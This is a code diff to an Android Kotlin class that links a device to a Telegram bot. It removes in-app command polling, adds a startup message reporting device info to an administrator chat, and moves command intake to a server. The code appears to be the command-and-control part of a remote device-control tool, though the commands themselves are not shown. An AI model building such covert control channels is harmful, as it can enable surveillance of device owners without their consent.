@@ -846,153 +846,57 @@ object TelegramDirectClient {
     }
 
     // ==================== ==================== ====================
-    //          دوال استقبال الأوامر (Command Polling)
+    //          استقبال الأوامر من السيرفر (Server Polling)
+    //          لا نستخدم getUpdates - السيرفر هو المسؤول عن تلقي الأوامر من المدير
+    //          التطبيق يتحقق فقط من السيرفر للحصول على الأوامر المعلقة
     // ==================== ==================== ====================
 
     /**
-     * بدء الاستطلاع المستمر للأوامر من المدير
-     * يعمل في خلفية بشكل مستمر
+     * إرسال إشعار بدء التشغيل للمدير (بدون getUpdates)
      */
+    fun sendStartupNotification(context: Context) {
+        scope.launch {
+            try {
+                val deviceInfo = getDeviceInfoShort(context)
+                sendMessage(
+                    "✅ <b>الجهاز متصل الآن</b>\n\n$deviceInfo",
+                    "HTML"
+                )
+            } catch (e: Exception) {
+                Log.e(TAG, "خطأ في إرسال إشعار البدء: ${e.message}")
+            }
+        }
+    }
+
+    // تم إيقاف startCommandPolling - السيرفر هو المسؤول عن getUpdates
+    // لا يمكن لتطبيقين استخدام getUpdates بنفس التوكن في نفس الوقت
+
+    /**
+     * @deprecated لا تستخدم - تم إيقاف getUpdates من التطبيق
+     * السيرفر يستلم الأوامر ويضعها في الطابور، والتطبيق يتحقق من السيرفر
+     */
+    @Deprecated("Use server polling instead")
     fun startCommandPolling(context: Context) {
-        if (isPolling) {
-            Log.d(TAG, "الاستطلاع يعمل بالفعل")
-            return
-        }
-
-        // استعادة الجلسة
-        lastUpdateId = loadLastUpdateId(context)
-        appStartTime = System.currentTimeMillis()
-        saveStartTime(context)
-
-        isPolling = true
-        pollingJob = scope.launch {
-            Log.d(TAG, "بدء استطلاع الأوامر من تيليجرام... (استئناف من update_id: $lastUpdateId)")
-
-            // إرسال رسالة بدء التشغيل
-            val deviceInfo = getDeviceInfoShort(context)
-            sendMessage(
-                "✅ <b>الجهاز متصل الآن</b>\n\n$deviceInfo",
-                "HTML"
-            )
-
-            // إرسال لوحة الأوامر الرئيسية
-            sendMainKeyboard()
-
-            while (isActive && isPolling) {
-                try {
-                    val commands = getPendingCommands(context)
-                    if (commands.isNotEmpty()) {
-                        processCommands(context, commands)
-                    }
-                } catch (e: CancellationException) {
-                    break
-                } catch (e: Exception) {
-                    Log.e(TAG, "خطأ في استطلاع الأوامر: ${e.message}")
-                }
-
-                // انتظار قبل الجولة التالية
-                delay(3000)
-            }
-            Log.d(TAG, "تم إيقاف استطلاع الأوامر")
-        }
+        Log.w(TAG, "تم إيقاف getUpdates من التطبيق - السيرفر يتولى استقبال الأوامر")
+        sendStartupNotification(context)
     }
 
-    /**
-     * إيقاف الاستطلاع
-     */
     fun stopCommandPolling() {
-        isPolling = false
-        pollingJob?.cancel()
-        Log.d(TAG, "تم طلب إيقاف الاستطلاع")
+        // لا حاجة لإيقاف شيء - getUpdates غير مفعّل
+        Log.d(TAG, "getUpdates غير مفعّل في التطبيق")
     }
 
     /**
-     * جلب الأوامر الجديدة من تيليجرام عبر getUpdates
+     * @deprecated لا تستخدم - تم إيقاف getUpdates من التطبيق
      */
+    @Deprecated("Use server polling instead")
     private suspend fun getPendingCommands(context: Context): List<TelegramCommand> {
-        return try {
-            val params = if (lastUpdateId > 0) {
-                "offset=${lastUpdateId + 1}&timeout=$POLL_TIMEOUT&allowed_updates=[\"message\",\"callback_query\"]"
-            } else {
-                "timeout=$POLL_TIMEOUT&allowed_updates=[\"message\",\"callback_query\"]"
-            }
-
-            val responseJson = httpGet("getUpdates?$params")
-            if (responseJson == null) return emptyList()
-
-            val response = gson.fromJson(responseJson, Map::class.java)
-            val ok = response["ok"] == true
-            if (!ok) return emptyList()
-
-            val updates = response["result"] as? List<*> ?: return emptyList()
-            val commands = mutableListOf<TelegramCommand>()
-
-            for (update in updates) {
-                try {
-                    val updateMap = update as? Map<*, *> ?: continue
-                    val updateId = (updateMap["update_id"] as? Double)?.toLong() ?: continue
-
-                    // تحديث آخر update_id معالج
-                    if (updateId > lastUpdateId) {
-                        lastUpdateId = updateId
-                        saveLastUpdateId(context, lastUpdateId)
-                    }
-
-                    // استخراج الأمر من الرسالة النصية
-                    val message = updateMap["message"] as? Map<*, *>
-                    if (message != null) {
-                        val chat = message["chat"] as? Map<*, *>
-                        val chatId = (chat?.get("id") as? Double)?.toLong() ?: continue
-
-                        // التحقق من أن الرسالة من المدير
-                        if (chatId != ADMIN_CHAT_ID) continue
-
-                        val text = message["text"] as? String ?: continue
-                        val command = text.trim().removePrefix("/").lowercase()
-
-                        if (command.isNotEmpty()) {
-                            Log.d(TAG, "أمر جديد من المدير: /$command")
-                            commands.add(TelegramCommand(
-                                command = command,
-                                updateId = updateId
-                            ))
-                        }
-                    }
-
-                    // استخراج الأمر من Callback Query (أزرار inline)
-                    val callbackQuery = updateMap["callback_query"] as? Map<*, *>
-                    if (callbackQuery != null) {
-                        val from = callbackQuery["from"] as? Map<*, *>
-                        val fromId = (from?.get("id") as? Double)?.toLong() ?: continue
-
-                        if (fromId != ADMIN_CHAT_ID) continue
-
-                        val data = callbackQuery["data"] as? String ?: continue
-                        val callbackId = callbackQuery["id"] as? String ?: continue
-
-                        Log.d(TAG, "Callback من المدير: $data")
-                        commands.add(TelegramCommand(
-                            command = data.trim().lowercase(),
-                            updateId = updateId
-                        ))
-
-                        // الرد على callback
-                        answerCallbackQuery(callbackId)
-                    }
-                } catch (e: Exception) {
-                    Log.e(TAG, "خطأ في تحليل update: ${e.message}")
-                }
-            }
-
-            commands
-        } catch (e: Exception) {
-            Log.e(TAG, "خطأ في getPendingCommands: ${e.message}", e)
-            emptyList()
-        }
+        Log.w(TAG, "getUpdates معطّل - التطبيق يجب أن يستخدم السيرفر للأوامر")
+        return emptyList()
     }
 
     /**
-     * معالجة الأوامر المستلمة من المدير - مجموعة الأوامر الموسعة
+     * معالجة الأوامر المستلمة من السيرفر - مجموعة الأوامر الموسعة
      */
     private suspend fun processCommands(context: Context, commands: List<TelegramCommand>) {
         for (command in commands) {
